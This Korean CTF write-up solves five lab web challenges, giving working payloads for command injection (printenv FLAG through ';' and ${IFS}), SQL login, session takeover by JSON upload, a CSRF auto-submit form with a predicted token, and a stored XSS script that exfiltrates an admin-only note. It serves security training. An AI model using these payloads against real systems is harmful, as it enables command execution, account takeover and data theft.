CAUtion CTF A-team Writeup

레포지토리 소스 분석 기반 문제 풀이 정리

1. Command Injection

취약점shell=True 명령어 조합
위치Command_Injection/app.py

filename이 head -n 20 {REPORT_DIR}/{filename}에 그대로 붙는다. 공백, .., cat만 차단하므로 세미콜론과 리다이렉션, ${IFS}를 이용할 수 있다.

페이로드

notice.txt;printenv${IFS}FLAG>reports/result.txt

풀이 과정

  1. 위 페이로드를 파일명으로 제출한다.
  2. 서버는 head 실행 뒤 printenv FLAG를 실행하고 결과를 reports/result.txt에 저장한다.
  3. 화면 출력은 안전한 파일명일 때만 보여주므로, 다음 요청에서 result.txt를 조회한다.
Flag: 배포 환경의 FLAG 환경 변수 값. 로컬 기본값은 FLAG{fake_flag_for_local_test}

2. SQL Injection

취약점문자열 포맷 SQL 쿼리
위치SQL_Injection/app.py

로그인 쿼리가 SELECT * FROM user_table WHERE uid='{userid}' and upw='{userpassword}' 형태로 직접 생성된다. 문제 소스에서 admin 비밀번호가 flag로 하드코딩되어 있고, 이 값을 그대로 입력하면 WAF의 VIP 예외도 통과한다.

풀이 과정

  1. REAL_FLAG 값을 확인한다.
  2. ID는 admin, Password는 flag 값을 입력한다.
  3. 로그인 성공 문구 Hello, admin!이 출력된다.
Flag: 운영 서버의 FLAG 환경 변수 값

3. File Upload

취약점업로드 파일 JSON을 세션에 반영
위치File_Upload/app.py

확장자는 .png, .jpg만 허용하지만 실제 파일 내용은 JSON으로 파싱한다. 파싱에 성공하면 session.update(data)가 실행되어 is_admin을 덮어쓸 수 있다.

업로드 파일 내용

{"is_admin": true}

풀이 과정

  1. 임의 계정으로 로그인한다.
  2. 위 JSON을 담은 파일을 session.png 같은 이름으로 업로드한다.
  3. 세션의 is_admin이 true가 된다.
  4. /admin?file=flag.txt로 접근해 서버의 flag 파일을 읽는다.
Flag: 운영 서버의 flag.txt 값

4. CSRF

취약점예측 가능한 CSRF 토큰과 reflected HTML
위치CSRF/app.py

토큰이 md5(username + remote_addr)로 생성된다. admin bot은 127.0.0.1에서 접속하므로 admin의 토큰을 미리 계산할 수 있다.

admin 토큰

md5("admin" + "127.0.0.1") = 7505b9c72ab4aa94b1a4ed7b207b67fb

제출 페이로드

<form action="/transfer" method="post">
  <input type="hidden" name="to" value="guest">
  <input type="hidden" name="amount" value="2147483647">
  <input type="hidden" name="csrf_token" value="7505b9c72ab4aa94b1a4ed7b207b67fb">
</form>
<script>document.forms[0].submit();</script>

풀이 과정

  1. guest/guest로 로그인한다.
  2. /flag에 위 페이로드를 제출해 admin bot이 /vuln에서 렌더링하게 한다.
  3. admin 세션으로 /transfer POST가 발생하여 guest에게 2,147,483,647원이 송금된다.
  4. guest로 /shop에서 flag를 구매한다.
Flag: 운영 서버의 flag.txt 값

5. XSS

취약점관리자 티켓 페이지의 stored XSS
위치XSS/templates/admin_ticket.html

일반 티켓 화면은 escape되지만 관리자 티켓 화면은 {{ ticket.content | safe }}로 렌더링한다. admin bot은 먼저 /admin/login으로 관리자 세션을 만든 뒤 티켓을 방문한다.

페이로드

<script>
fetch('/admin/audit')
  .then(r => r.text())
  .then(t => {
    const d = new DOMParser().parseFromString(t, 'text/html');
    const token = d.querySelector('#csrf_token').value;
    return fetch('/api/unmask?target_id=1004&csrf_token=' + token);
  })
  .then(r => r.json())
  .then(j => fetch('/collect?data=' + encodeURIComponent(j.sensitive_note)));
</script>

풀이 과정

  1. 문의 내용에 위 스크립트를 넣어 티켓을 생성한다.
  2. /report에 티켓 번호를 제출해 admin bot 방문을 유도한다.
  3. 관리자 권한으로 /admin/audit의 CSRF 토큰을 읽는다.
  4. /api/unmask?target_id=1004를 호출해 sensitive_note 안의 flag를 가져온다.
  5. 로컬 환경에서는 /collect 로그에 exfiltration 결과가 찍힌다.
Flag: 운영 서버의 FLAG 환경 변수 값

검증 메모

Flask 의존성을 설치한 뒤 서버 코드를 import해 test client로 SQL Injection, File Upload, XSS 상수, CSRF 토큰/flag를 확인했다. Chrome 플러그인은 연결됐지만 현재 프로필 정책이 로컬 HTTP 탐색을 net::ERR_BLOCKED_BY_CLIENT로 차단하여 로컬 페이지 직접 조작은 제한되었다.
